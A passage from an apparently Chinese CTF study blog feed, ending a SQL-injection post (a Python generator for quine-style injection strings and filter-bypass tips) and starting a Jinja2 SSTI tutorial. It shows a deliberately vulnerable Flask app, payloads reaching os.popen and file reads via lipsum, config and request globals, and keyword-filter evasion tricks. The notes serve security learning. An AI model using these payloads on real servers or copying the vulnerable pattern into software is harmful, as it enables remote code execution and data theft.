class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_sql</span>():<br>    sql = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入你的SQL语句, 不用写关键查询的信息 形如 1&#x27;union select #\n&quot;</span>)<br>    <span class="hljs-keyword">return</span> sql<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_quotes</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_base</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_base_to_sql</span>(<span class="hljs-params">sql, base</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_sql_with_base</span>(<span class="hljs-params">base, sql</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_sql</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;.&quot;&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 输入SQL语句</span><br>    sql = input_sql()<br>    <span class="hljs-comment"># 替换单引号为双引号</span><br>    sql2 = replace_quotes(sql)<br>    <span class="hljs-comment"># 生成base字符串</span><br>    base = generate_base()<br>    <span class="hljs-comment"># 将base添加到sql语句中</span><br>    sql_with_base = add_base_to_sql(sql2, base)<br>    <span class="hljs-comment"># 用base修补sql语句</span><br>    patched_sql = patch_sql_with_base(base.replace(<span class="hljs-string">&quot;.&quot;</span>, sql_with_base), sql)<br>    <span class="hljs-comment"># 格式化最终SQL语句</span><br>    final_sql = format_sql(patched_sql)<br>    <span class="hljs-comment"># 输出最终结果</span><br>    <span class="hljs-built_in">print</span>(final_sql)<br><span class="hljs-comment"># 运行主函数</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><a href="https://www.nssctf.cn/problem/334">例题</a></p><h3 id="四、刷题笔记"><a href="#四、刷题笔记" class="headerlink" title="四、刷题笔记"></a>四、刷题笔记</h3><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><h4 id="过滤-or"><a href="#过滤-or" class="headerlink" title="过滤 or"></a>过滤 or</h4><p>使用||代替</p><h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤 &#x3D;"></a>过滤 &#x3D;</h4><p>使用like代替</p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>使用&#x2F;**&#x2F;绕过</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti模板注入学习</title>
    <link href="/2024/07/03/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/07/03/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>前言:主要讲的python的jinjia2,如果以后遇到其他相关的会继续补充。</p><p>参考文章:</p><p>1.<a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇)</a></p><p>2.<a href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%7B%22request_id%22:%22171998276316800182178648%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=171998276316800182178648&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~hot_rank-5-120739989-null-null.nonecase&utm_term=ssit&spm=1018.2226.3001.4450">SSTI模板注入总结</a></p><p>3.<a href="https://xz.aliyun.com/t/6885?time__1311=n4+xnD0DRDyB5q053b7eit7Dt3MKAKDkWeD&alichlgref=https://cn.bing.com/#toc-0">Python模板注入(SSTI)深入学习</a></p><p>4.<a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过(进阶篇)</a></p><p>5.<a href="https://blog.csdn.net/q20010619/article/details/120493997">CTFshow刷题日记-WEB-SSTI(web361-372)_ctfshow ssti 371-CSDN博客</a></p><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-初步了解"><a href="#1-初步了解" class="headerlink" title="1.初步了解"></a>1.初步了解</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)</p><p>当使用一些框架的时候，服务端接收了用户的恶意输入以,未经处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>举个简单的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from flask import Flask, request, render<span class="hljs-emphasis">_template_</span>string<br>app = Flask(<span class="hljs-strong">__name__</span>)<br>@app.route(&#x27;/&#x27;)<br>def home():<br><span class="hljs-code">    return &#x27;&#x27;&#x27;</span><br><span class="hljs-code">    &lt;form action=&quot;/greet&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-code">        &lt;label for=&quot;name&quot;&gt;Enter your name:&lt;/label&gt;</span><br><span class="hljs-code">        &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot;&gt;</span><br><span class="hljs-code">        &lt;input type=&quot;submit&quot; value=&quot;Greet me&quot;&gt;</span><br><span class="hljs-code">    &lt;/form&gt;</span><br><span class="hljs-code">    &#x27;&#x27;&#x27;</span><br><span class="hljs-code">@app.route(&#x27;/greet&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="hljs-code">def greet():</span><br><span class="hljs-code">    name = request.form[&#x27;name&#x27;]</span><br><span class="hljs-code">    # 这里使用 render_template_string 存在模板注入风险</span><br><span class="hljs-code">    template = f&quot;Hello, &#123;name&#125;!&quot;</span><br><span class="hljs-code">    return render_template_string(template)</span><br><span class="hljs-code">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-code">    app.run(debug=True)</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/1.png" alt="ex1"></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/2.png" alt="ex2"></p><h3 id="2-简单判断"><a href="#2-简单判断" class="headerlink" title="2.简单判断"></a>2.简单判断</h3><p>模板引擎其实有许多种，上面的例子只是python的一种。</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/3.png" alt="pic"></p><p>可以通过简要的尝试进行初步判断类型。</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/4.png" alt="判断"></p><h2 id="二、语法"><a href="#二、语法" class="headerlink" title="二、语法"></a>二、语法</h2><h3 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h3><p>在python中，主要流程是按照类-&gt;基类-&gt;子类-&gt;危险函数的流程利用ssti，首先了解一下语法。</p><h4 id="1-class"><a href="#1-class" class="headerlink" title="1.__class__"></a>1.__class__</h4><p>用来查看变量所属的类,格式为<code>变量.__class__</code></p><p>比如字符串得到的就是<code>&lt;class &#39;str&#39;&gt;</code></p><h4 id="2-bases"><a href="#2-bases" class="headerlink" title="2.__bases__"></a>2.__bases__</h4><p>以元组的形式返回类所直接继承的类。，注意是类的基类，格式为<code>变量.__class__.__bases__</code></p><p>同时也可以加上数组，比如<code>变量.__class__.__bases__[0]</code>来获得第一个基类。</p><p>ps(base是以字符串的形式返回类的基类)</p><h4 id="3-mro"><a href="#3-mro" class="headerlink" title="3.__mro__"></a>3.__mro__</h4><p>返回一个包含对象所继承的基类元组,返回解析方法调用的顺序。</p><h4 id="4-subclasses"><a href="#4-subclasses" class="headerlink" title="4.__subclasses__()"></a>4.__subclasses__()</h4><p>获取类的所有子类，同时也可以在末尾加数组，指定索引值。</p><h4 id="5-init"><a href="#5-init" class="headerlink" title="5.__init__"></a>5.__init__</h4><p>类的初始化，返回为function。便于利用该函数调用globals。</p><h4 id="6-globals"><a href="#6-globals" class="headerlink" title="6.__globals__"></a>6.__globals__</h4><p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p><hr><p>以上是常见的一些基本语法内容</p><h3 id="2-类的知识总结"><a href="#2-类的知识总结" class="headerlink" title="2.类的知识总结"></a>2.类的知识总结</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span>            类的一个内置属性，表示实例对象的类。<br><span class="hljs-strong">__base__</span>             类型对象的直接基类<br><span class="hljs-strong">__bases__</span>            类型对象的全部基类，以元组形式，类型的实例通常没有属性 <span class="hljs-strong">__bases__</span><br><span class="hljs-strong">__mro__</span>              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。<br><span class="hljs-strong">__subclasses__</span>()     返回这个类的子类集合，<br><span class="hljs-strong">__init__</span>             初始化类，返回的类型是function<br><span class="hljs-strong">__globals__</span>          使用方式是 函数名.<span class="hljs-strong">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。<br><span class="hljs-strong">__dic__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-strong">__dict__</span>里<br><span class="hljs-strong">__getattribute__</span>()   实例、类、函数都具有的<span class="hljs-strong">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="hljs-strong">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><span class="hljs-strong">__getitem__</span>()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.<span class="hljs-strong">__getitem__</span>(&#x27;b&#x27;)<br><span class="hljs-strong">__builtins__</span>         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<span class="hljs-strong">__builtins__</span>与<span class="hljs-strong">__builtin__</span>的区别就不放了，百度都有。<br><span class="hljs-strong">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]<br><span class="hljs-strong">__str__</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。<br>url<span class="hljs-emphasis">_for              flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">get_</span>flashed<span class="hljs-emphasis">_messages flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">lipsum               flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且lipsum.<span class="hljs-strong">__globals__</span>含有os模块：&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="hljs-emphasis">current_</span>app          应用上下文，一个全局变量。<br><br>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()<br>request.args.x1    get传参<br>request.values.x1  所有参数<br>request.cookies      cookies参数<br>request.headers      请求头参数<br>request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)<br>request.data   post传参(Content-Type:a/b)<br>request.json post传json  (Content-Type: application/json)<br>config               当前application的所有配置。此外，也可以这样&#123;&#123; config.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;<br>g                    &#123;&#123;g&#125;&#125;得到<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">flask.g</span> <span class="hljs-attr">of</span> &#x27;<span class="hljs-attr">flask_ssti</span>&#x27;&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="3-常见过滤器"><a href="#3-常见过滤器" class="headerlink" title="3.常见过滤器"></a>3.常见过滤器</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常用的过滤器<br>int()：将值转换为int类型；<br>float()：将值转换为float类型；<br>lower()：将字符串转换为小写；<br>upper()：将字符串转换为大写；<br>title()：把值中的每个单词的首字母都转成大写<br>capitalize()：把变量值的首字母转成大写，其余字母转小写；<br>trim()：截取字符串前面和后面的空白字符；<br>wordcount()：计算一个长字符串中单词的个数；<br>reverse()：字符串反转；<br>replace(value,old,new)： 替换将old替换为new的字符串；<br>truncate(value,length=255,killwords=False)：截取length长度的字符串；<br>striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；<br>escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。<br>safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span></span>hello<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span>&#x27;|safe&#125;&#125;；<br>list()：将变量列成列表；<br>string()：将变量转换成字符串；<br>join()：将一个序列中的参数值拼接成字符串。示例看上面payload；<br>abs()：返回一个数值的绝对值；<br>first()：返回一个序列的第一个元素；<br>last()：返回一个序列的最后一个元素；<br>format(value,arags,<span class="hljs-emphasis">*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">length()：返回一个序列或者字典的长度；</span><br><span class="hljs-emphasis">sum()：返回列表内数值的和；</span><br><span class="hljs-emphasis">sort()：返回排序后的列表；</span><br><span class="hljs-emphasis">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="hljs-emphasis">length()返回字符串的长度，别名是count</span><br></code></pre></td></tr></table></figure><p>对于2.3两个是直接进行转载便于自身本地的及时查找。</p><h2 id="三、进阶知识"><a href="#三、进阶知识" class="headerlink" title="三、进阶知识"></a>三、进阶知识</h2><h3 id="1-模板语法"><a href="#1-模板语法" class="headerlink" title="1.模板语法"></a>1.模板语法</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;%...%&#125;可以进行声明变量，也可以进行循环语句和条件语句<br><br>&#123;&#123;...&#125;&#125;将表达式打印到模板输出<br><br>&#123;#...#&#125;表示未包含在模板输出中的注释<br><br><span class="hljs-section">##可以有和&#123;%%&#125;相同的效果</span><br></code></pre></td></tr></table></figure><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h3><p>标准的python语法使用点<code>（.）</code>外，还可以使用中括号<code>（[]）</code>来访问变量的属性。也就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&#x27;__classs__&#x27;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>You can use a dot (.) to access attributes of a variable in addition to the standard Python <strong>getitem</strong> “subscript” syntax ([]). –官方原文</p><p>这里就是介绍了如果禁用点可以用中括号，而实际就是调用了getitem这个函数，对于取键值也可以调用这个函数</p><hr><p>除此之外，除了调用，也可以用自带的一些办法，比如说pop</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">pop(key[,default])<br>参数<br>key: 要删除的键值<br>default: 如果没有 key，返回 default 值<br>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。<br></code></pre></td></tr></table></figure><p>也可以用<code>list.pop(&quot;var&quot;)</code>,建议不要使用，可能删除导致服务器崩坏。</p><p>同时也可以尝试以下两种的情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">dict.get(key, default=None)<br>返回指定键的值，如果值不在字典中返回default值<br><br>dict.setdefault(key, default=None)<br>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure><hr><p>调用变量的实际情况，应该如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;.<span class="hljs-strong">__class__</span><br>&quot;&quot;.<span class="hljs-strong">__getattribute__</span>(&quot;<span class="hljs-strong">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><p>如果出现了一些过滤，也可以进行简单的绕过</p><h3 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h3><h4 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1.拼接"></a>1.拼接</h4><p>“cla”+”ss”</p><p>实际测试的时候，jinjia2默认<code>&quot;cla&quot;&quot;ss&quot;</code>是等同于<code>&quot;class&quot;</code>的，所以也不必加+。</p><h4 id="2-反转"><a href="#2-反转" class="headerlink" title="2.反转"></a>2.反转</h4><p>“<strong>ssalc</strong>“[::-1]</p><h4 id="3-ascii绕过"><a href="#3-ascii绕过" class="headerlink" title="3.ascii绕过"></a>3.ascii绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将97转换为对应的字符&#x27;a&#x27;</span><br>char_a = <span class="hljs-string">&quot;&#123;0:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">97</span>)<br><span class="hljs-built_in">print</span>(char_a)  <span class="hljs-comment"># 输出: &#x27;a&#x27;</span><br><span class="hljs-comment"># 将多个整数转换为对应的字符并组合成字符串&#x27;__class__&#x27;</span><br>formatted_string = <span class="hljs-string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">95</span>, <span class="hljs-number">95</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">95</span>, <span class="hljs-number">95</span>)<br><span class="hljs-built_in">print</span>(formatted_string)  <span class="hljs-comment"># 输出: &#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure><p>前面的{0:c}是占位符，类比下去对应后面的内容。</p><h4 id="4-编码绕过"><a href="#4-编码绕过" class="headerlink" title="4.编码绕过"></a>4.编码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 直接字符表示</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;__class__&quot;</span>)<br><br><span class="hljs-comment"># 转义字符表示</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>)<br><span class="hljs-comment">#十六进制转义</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)<br><span class="hljs-comment">#十六进制加ascii转义</span><br><span class="hljs-comment"># 对于python2也可以Base64 编码和解码</span><br>encoded_str = <span class="hljs-string">&quot;X19jbGFzc19f&quot;</span><br>decoded_str = encoded_str.decode(<span class="hljs-string">&quot;base64&quot;</span>)<br><span class="hljs-built_in">print</span>(decoded_str)  <span class="hljs-comment"># 输出: &#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="5-利用chr函数"><a href="#5-利用chr函数" class="headerlink" title="5.利用chr函数"></a>5.利用chr函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span> %&#125;<br><span class="hljs-comment">#这里使用了 Jinja2 模板中的 set 语句，将 chr 函数赋值给一个模板变量 chr。</span><br><span class="hljs-comment">#chr函数将数字转化为字符</span><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">99</span>)%2bchr(<span class="hljs-number">108</span>)%2bchr(<span class="hljs-number">97</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)]&#125;&#125;<br><span class="hljs-comment">#最终显示的也是__class__</span><br></code></pre></td></tr></table></figure><h4 id="6-利用-拼接"><a href="#6-利用-拼接" class="headerlink" title="6.利用~拼接"></a>6.利用~拼接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;__cla&#x27;</span> %&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[a~b]&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="7-大小写绕过"><a href="#7-大小写绕过" class="headerlink" title="7.大小写绕过"></a>7.大小写绕过</h4><p>前提是只过滤大写或者小写，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__CLASS__&quot;</span>.lower()]<br></code></pre></td></tr></table></figure><h3 id="4-过滤器"><a href="#4-过滤器" class="headerlink" title="4.过滤器"></a>4.过滤器</h3><p>这部分内容上面都有一个表，主要跟着详细介绍一下</p><h4 id="1-attr"><a href="#1-attr" class="headerlink" title="1.attr"></a>1.attr</h4><p>用于动态访问对象的属性，即访问管道符前面的内容</p><p>常用于.和[]被过滤的情况，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;|attr(&quot;<span class="hljs-strong">__class__</span>&quot;)<br>相当于<br>&quot;&quot;.<span class="hljs-strong">__class__</span><br></code></pre></td></tr></table></figure><p>返回的就是str</p><h4 id="2-format"><a href="#2-format" class="headerlink" title="2.format"></a>2.format</h4><p>功能可以参考ascii的绕过，直接放案例了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;<span class="hljs-strong">__class__</span>&#x27;<br>&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]<br></code></pre></td></tr></table></figure><h4 id="3-first-last-random"><a href="#3-first-last-random" class="headerlink" title="3.first ,last, random"></a>3.first ,last, 